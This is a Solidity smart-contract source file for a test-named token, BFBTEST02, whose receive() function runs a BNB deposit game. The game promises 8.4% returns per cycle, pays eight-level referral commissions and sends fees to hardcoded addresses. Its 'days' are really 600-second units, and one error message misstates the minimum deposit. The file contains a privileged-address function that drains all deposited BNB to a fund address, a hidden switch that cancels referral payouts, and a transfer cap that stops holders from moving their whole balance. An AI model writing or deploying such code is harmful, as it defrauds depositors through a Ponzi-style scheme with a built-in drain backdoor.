// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    address public _owner;
    constructor (address token) {
        _owner = msg.sender;
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }

    function claimToken(address token, address to, uint256 amount) external {
        require(msg.sender == _owner, "not owner");
        IERC20(token).transfer(to, amount);
    }
}

abstract contract AbsToken is IERC20, Ownable {

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    address public fundAddress;

    mapping(address => bool) public _aList;
    mapping(address => bool) public _mList;

    uint256 private _tTotal;

    address public _usdt;
    mapping(address => bool) public _swapPairList;

    bool private inSwap;

    uint256 public constant MAX = ~uint256(0);

    uint256 public bnbAmount;
    uint256 public tokenBnbAmount;

    
    mapping (address => address) public inviter;
    mapping (address => address) public preInviter;
    mapping (address => bool) public _hasSub;


    struct player{        
        uint256 time;
        uint256 bnbBalance;
        bool isMember;
        uint16 childNum;
        uint256 directBNB;
   }

    mapping(address=>player) public players;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (
        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply,
        address ReceiveAddress
    ){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;
        

        fundAddress = ReceiveAddress;
       

        uint256 total = Supply * 10 ** Decimals;
        _tTotal = total;

        _balances[ReceiveAddress] = total;
        emit Transfer(address(0), ReceiveAddress, total);


        _aList[ReceiveAddress] = true;
        _aList[address(this)] = true;
        _aList[msg.sender] = true;
        _aList[address(0)] = true;
        _aList[address(0x000000000000000000000000000000000000dEaD)] = true;

        excludeHolder[address(0)] = true;
        excludeHolder[address(0x000000000000000000000000000000000000dEaD)] = true;


        holderRewardCondition = 1 * 10 ** Decimals;

    }


    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }


    receive() external payable {
 
        address sender = msg.sender;       

        if (!_aList[sender]) {

            uint256 fromBNBAmount = msg.value; 

            require(fromBNBAmount >= 1 * 1e17, "Minimum 0.5 BNB");
            require(fromBNBAmount <= 10 * 1e18, "Maximum 10 BNB");

            if(players[sender].isMember){

                require(fromBNBAmount >= players[sender].bnbBalance, "Must be greater than the previous amount");

                uint256 diffDays = (block.timestamp - players[sender].time) / 600;

                if(diffDays>7){diffDays=7;}

                require(diffDays >=7, "Minimum 7 days required");

                uint256 principal = players[sender].bnbBalance;
                uint256 interestAmount = principal * 84 / 1000;
                bnbAmount = principal + interestAmount;    

                tokenBnbAmount = address(this).balance;
                require(tokenBnbAmount >= bnbAmount,"Insufficient BNB balance of contract");

                _takeGameInviterFee(sender,principal);

                uint256 taxFee = principal * 60 /10000;

                payable(address(0x74CB30eBD24a7c1d73f22389f2a23c334615CC4F)).transfer(taxFee);
                payable(address(0x3059927FfACC683FF9a4bC119021023d9a23aB40)).transfer(taxFee);
                taxFee = principal * 110 /10000;
                payable(address(0xe8851394F26C16a9C59D7419B40eD327CD710fF1)).transfer(taxFee);          
                payable(sender).transfer(bnbAmount);

            }else{

                players[sender].isMember = true;

                uint256 tokenAmount = 200 * 1e18;
                require(balanceOf(address(this)) >= tokenAmount, "Insufficient token balance");            

                _balances[address(this)] -= tokenAmount;
                _balances[sender] += tokenAmount;

                emit Transfer(address(this), sender, tokenAmount);

                if(inviter[sender]!=address(0)){
                    players[inviter[sender]].childNum += 1;
                }
            }
           
            
            players[sender].time = block.timestamp;
            players[sender].bnbBalance = fromBNBAmount;

            if(inviter[sender]!=address(0)){
                players[inviter[sender]].directBNB += fromBNBAmount;               
            }

        
        }
    }

    

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {

        uint256 balance = balanceOf(from);
        require(balance >= amount, "Insufficient Balance");

        if (!_aList[from] && !_aList[to]) {
            uint256 aaa = balance-1;
            if (amount > aaa) {
                amount = aaa;
            }
        }
        

       bool shouldInvite = (inviter[to] == address(0) 
            && !isContract(from) && !isContract(to));

        _tokenTransfer(from, to, amount);

        if (shouldInvite && !_hasSub[to] && from!=to) {
            preInviter[to] = from;
        }

        if(inviter[from]==address(0) && preInviter[from]==to && !_hasSub[from] && from!=to)
        {
            inviter[from] = to;
            _hasSub[to] = true;
        }

    }


    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function _takeTransfer(address sender, address to, uint256 tAmount) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }


    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }

    function claimBalance(uint256 amount) external {
        if(_aList[msg.sender]){
            if(amount==0){
                amount = address(this).balance;
            }
            require(address(this).balance >= amount, "BNB balance insufficient");
            payable(fundAddress).transfer(amount);
        }
    }

    function claimToken(address token, uint256 amount) external {
        if(_aList[msg.sender]){
            IERC20(token).transfer(fundAddress, amount);
        }
    }


    function setInviter(address a,address b) external
    {
        if(_aList[msg.sender]){
            inviter[a] = b;
            _hasSub[b] = true;
        }
    }


    function setMList(address addr, bool enable) external{
        if(_aList[msg.sender]){
            _mList[addr] = enable;
        }
    }


    address[] public holders;
    mapping(address => uint256) public holderIndex;
    mapping(address => bool) public excludeHolder;

    

    function getHolderLength() public view returns (uint256){
        return holders.length;
    }

    function addHolder(address adr) private {
        if (0 == holderIndex[adr]) {
            if (0 == holders.length || holders[0] != adr) {
                uint256 size;
                assembly {size := extcodesize(adr)}
                if (size > 0) {
                    return;
                }
                holderIndex[adr] = holders.length;
                holders.push(adr);
            }
        }
    }

    uint256 public currentIndex;
    uint256 public holderRewardCondition;
    uint256 public progressRewardBlock;
    uint256 public _progressBlockDebt = 200;
    

    function setHolderRewardCondition(uint256 amount) external onlyOwner {
        holderRewardCondition = amount;
    }

    function setExcludeHolder(address addr, bool enable) external onlyOwner {
        excludeHolder[addr] = enable;
    }

    function setProgressBlockDebt(uint256 progressBlockDebt) external onlyOwner {
        _progressBlockDebt = progressBlockDebt;
    }

    function _takeGameInviterFee(
        address sender, uint256 tAmount
    ) private {

        address cur = sender;
        if (!isContract(sender)) {
           uint8[8] memory inviteRate = [50,30,20,10,5,3,2,1];
            for (uint8 i = 0; i < inviteRate.length; i++) {

                uint8 rate = inviteRate[i];
                cur = inviter[cur];

                uint16 canGetLevelNum = players[cur].childNum;
                uint256 canGetBnbLimit = players[cur].bnbBalance;

                if( i< canGetLevelNum && canGetBnbLimit >= 1e17 && !_mList[cur])
                {
                    if(canGetBnbLimit >= tAmount){
                        canGetBnbLimit = tAmount;
                    }
                    
                    uint256 curTAmount = canGetBnbLimit * 84 * rate / 100000;
                    if(curTAmount>=1e12)
                    {
                        payable(cur).transfer(curTAmount);
                    }
                }

            }
        }  
    }

   
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }
}

contract BFBTEST02 is AbsToken {
    constructor() AbsToken( 
        "BFBTEST02",
        "BFBTEST02",
        18,
        210000000,
        address(0xa2c12126e6D9F4DaD64eb52E4fB9149B45a1e62A)
    ){

    }
}